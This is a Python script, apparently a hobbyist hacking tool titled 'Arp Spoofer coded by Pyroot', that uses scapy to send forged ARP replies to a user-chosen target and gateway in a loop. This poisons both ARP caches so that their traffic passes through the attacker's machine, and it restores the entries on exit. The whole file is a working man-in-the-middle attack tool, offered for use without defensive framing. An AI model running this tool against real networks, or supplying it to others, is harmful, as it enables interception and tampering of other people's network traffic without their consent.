#!/usr/bin/env python
from time import sleep
import scapy.all as scapy


def banner():
    print("""
    \u001b[32;1m
    ██████╗ ██╗   ██╗ █████╗ ██████╗ ██████╗ ███████╗██████╗  ██████╗  ██████╗ ███████╗
    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
    ██████╔╝ ╚████╔╝ ███████║██████╔╝██████╔╝███████╗██████╔╝██║   ██║██║   ██║█████╗  
    ██╔═══╝   ╚██╔╝  ██╔══██║██╔══██╗██╔═══╝ ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  
    ██║        ██║   ██║  ██║██║  ██║██║     ███████║██║     ╚██████╔╝╚██████╔╝██║     
    ╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     
    \u001b[0m
    """)
    print("\u001b[31;1m\t\t\t\tArp Spoofer coded by Pyroot\n\n \u001b[0m")


def get_mac(ip):
    # creating a arp packet
    arp_packet = scapy.ARP(pdst=ip)
    # creating an ethernet packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # attaching the arp packet with the ether packet
    arp_request_broadcast = broadcast / arp_packet
    # srp gives back a list of two elements 1)answered and 2) unanswered packets ,answered packets
    # consists of two elements 1)packet sent and 2) answer , here we are taking the packet sent from
    # the answered_list variable
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    src_mac = get_mac(src_ip)
    dest_mac = get_mac(dest_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, psrc=src_ip, hwsrc=src_mac, hwdst=dest_mac)
    scapy.send(packet, verbose=False, count=4)


banner()
try:
    target_ip = input("Enter the target ip ==>")
    gateway_ip = input("Enter the gateway ip ==>")
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            print("\r[+]ARP Packets sent: " + str(sent_packets_count), end="")

            sent_packets_count += 2
            sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Detected \u001b[31;1m CTRL + C \u001b[0m..........Quitting")
        sleep(0.5)
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

except KeyboardInterrupt:
    print("\n")



